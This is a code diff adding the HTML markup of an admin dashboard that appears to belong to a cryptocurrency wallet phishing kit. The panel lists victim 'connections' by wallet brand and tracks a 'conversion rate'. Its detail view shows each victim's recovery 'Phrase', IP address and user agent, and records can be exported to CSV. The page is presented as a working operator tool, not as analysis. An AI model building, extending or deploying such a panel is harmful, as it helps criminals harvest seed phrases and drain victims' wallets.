@@ -1,0 +1,267 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="admin.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+</head>
+<body>
+  <div class="dashboard-container">
+    <div class="sidebar">
+      <div class="brand">
+        <h2>Admin Panel</h2>
+      </div>
+      <nav class="nav-menu">
+        <ul>
+          <li class="active"><a href="#" data-section="dashboard"><span class="icon">📊</span> Dashboard</a></li>
+          <li><a href="#" data-section="activities"><span class="icon">📈</span> User Activities</a></li>
+          <li><a href="#" data-section="settings"><span class="icon">⚙️</span> Settings</a></li>
+          <li><a href="#" id="logout-btn"><span class="icon">🚪</span> Logout</a></li>
+        </ul>
+      </nav>
+    </div>
+    
+    <div class="main-content">
+      <div class="top-bar">
+        <div class="search-box">
+          <input type="text" placeholder="Search...">
+        </div>
+        <div class="profile">
+          <span class="notification-badge">3</span>
+          <div class="profile-info">
+            <span class="profile-name">Admin</span>
+            <span class="profile-role">Super Admin</span>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Dashboard Section -->
+      <section id="dashboard-section" class="content-section active">
+        <div class="section-header">
+          <h1>Dashboard Overview</h1>
+          <p class="timestamp">Last updated: <span id="last-updated">Loading...</span></p>
+        </div>
+        
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-value" id="total-connections">0</div>
+            <div class="stat-label">Total Connections</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="today-connections">0</div>
+            <div class="stat-label">Today's Connections</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="unique-wallets">0</div>
+            <div class="stat-label">Unique Wallets</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="conversion-rate">0%</div>
+            <div class="stat-label">Conversion Rate</div>
+          </div>
+        </div>
+        
+        <div class="recent-activity-container">
+          <div class="container-header">
+            <h2>Recent Activity</h2>
+            <button class="refresh-btn" id="refresh-dashboard">Refresh</button>
+          </div>
+          <div class="activity-list" id="recent-activity-list">
+            <div class="empty-state">
+              <p>No recent activities</p>
+            </div>
+          </div>
+        </div>
+      </section>
+      
+      <!-- Activities Section -->
+      <section id="activities-section" class="content-section">
+        <div class="section-header">
+          <h1>User Activities</h1>
+          <div class="actions">
+            <button class="btn-secondary" id="export-activities">Export CSV</button>
+            <button class="refresh-btn" id="refresh-activities">Refresh</button>
+          </div>
+        </div>
+        
+        <div class="filter-bar">
+          <div class="filter-group">
+            <label>Filter by Wallet:</label>
+            <select id="wallet-filter">
+              <option value="all">All Wallets</option>
+              <option value="metamask">MetaMask</option>
+              <option value="trustwallet">Trust Wallet</option>
+              <option value="coinbase">Coinbase</option>
+              <option value="phantom">Phantom</option>
+              <option value="binance">Binance</option>
+              <option value="exodus">Exodus</option>
+              <option value="ledger">Ledger</option>
+              <option value="trezor">Trezor</option>
+            </select>
+          </div>
+          <div class="filter-group">
+            <label>Date Range:</label>
+            <select id="date-filter">
+              <option value="all">All Time</option>
+              <option value="today">Today</option>
+              <option value="yesterday">Yesterday</option>
+              <option value="week">Last 7 Days</option>
+              <option value="month">Last 30 Days</option>
+            </select>
+          </div>
+        </div>
+        
+        <div class="data-table-container">
+          <table class="data-table" id="activities-table">
+            <thead>
+              <tr>
+                <th>ID</th>
+                <th>Wallet</th>
+                <th>Date & Time</th>
+                <th>IP Address</th>
+                <th>Status</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="activities-table-body">
+              <!-- Activities will be populated here -->
+            </tbody>
+          </table>
+          <div class="empty-state" id="activities-empty-state">
+            <p>No activities found</p>
+          </div>
+        </div>
+      </section>
+      
+      <!-- Settings Section -->
+      <section id="settings-section" class="content-section">
+        <div class="section-header">
+          <h1>Settings</h1>
+        </div>
+        
+        <div class="settings-container">
+          <div class="settings-card">
+            <h3>Notification Settings</h3>
+            <div class="settings-form">
+              <div class="form-group">
+                <label class="toggle-switch">
+                  <input type="checkbox" checked>
+                  <span class="toggle-slider"></span>
+                  <span class="toggle-label">Email Notifications</span>
+                </label>
+              </div>
+              <div class="form-group">
+                <label class="toggle-switch">
+                  <input type="checkbox" checked>
+                  <span class="toggle-slider"></span>
+                  <span class="toggle-label">New Connection Alerts</span>
+                </label>
+              </div>
+              <div class="form-group">
+                <label class="toggle-switch">
+                  <input type="checkbox">
+                  <span class="toggle-slider"></span>
+                  <span class="toggle-label">Daily Reports</span>
+                </label>
+              </div>
+            </div>
+          </div>
+          
+          <div class="settings-card">
+            <h3>Account Settings</h3>
+            <div class="settings-form">
+              <div class="form-group">
+                <label>Admin Username</label>
+                <input type="text" value="cblsupport001" readonly>
+              </div>
+              <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" placeholder="admin@example.com">
+              </div>
+              <div class="form-group">
+                <label>Change Password</label>
+                <input type="password" placeholder="New Password">
+              </div>
+              <button class="btn-primary">Save Changes</button>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+  </div>
+
+  <!-- Activity Detail Modal -->
+  <div class="modal" id="activity-detail-modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3>Activity Details</h3>
+        <button class="close-btn">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div class="detail-row">
+          <div class="detail-label">Wallet:</div>
+          <div class="detail-value" id="detail-wallet">-</div>
+        </div>
+        <div class="detail-row">
+          <div class="detail-label">Phrase:</div>
+          <div class="detail-value" id="detail-phrase">-</div>
+        </div>
+        <div class="detail-row">
+          <div class="detail-label">Timestamp:</div>
+          <div class="detail-value" id="detail-timestamp">-</div>
+        </div>
+        <div class="detail-row">
+          <div class="detail-label">IP Address:</div>
+          <div class="detail-value" id="detail-ip">-</div>
+        </div>
+        <div class="detail-row">
+          <div class="detail-label">User Agent:</div>
+          <div class="detail-value" id="detail-useragent">-</div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-delete" id="delete-activity">Delete Record</button>
+        <button class="btn-secondary close-modal">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Login Modal -->
+  <div class="modal" id="login-modal">
+    <div class="modal-content login-modal">
+      <div class="modal-header">
+        <h3>Admin Login</h3>
+      </div>
+      <div class="modal-body">
+        <div class="form-group">
+          <label>Username</label>
+          <input type="text" id="login-username" placeholder="Enter admin username">
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="login-password" placeholder="Enter admin password">
+        </div>
+        <div class="error-message" id="login-error"></div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-primary" id="login-btn">Login</button>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Notification Toast -->
+  <div class="toast" id="notification-toast">
+    <div class="toast-icon">🔔</div>
+    <div class="toast-content">
+      <div class="toast-title">New Connection</div>
+      <div class="toast-message">A new wallet has been connected</div>
+    </div>
+    <button class="toast-close">&times;</button>
+  </div>
+
+  <script src="admin.js"></script>
+</body>
+</html>
